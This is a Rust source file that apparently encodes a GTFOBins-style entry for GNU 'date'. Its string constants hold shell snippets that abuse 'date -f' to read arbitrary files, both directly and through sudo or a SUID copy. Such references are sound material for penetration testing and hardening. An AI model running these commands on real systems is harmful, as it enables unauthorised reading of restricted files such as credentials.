
pub static BIN_NAME: &'static str = "date";
pub static BIN_DESC: &'static str = "Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.

This only works for the GNU variant of `date`.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    date -f $LFILE
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which date) .

    LFILE=file_to_read
    ./date -f $LFILE
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo date -f $LFILE
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
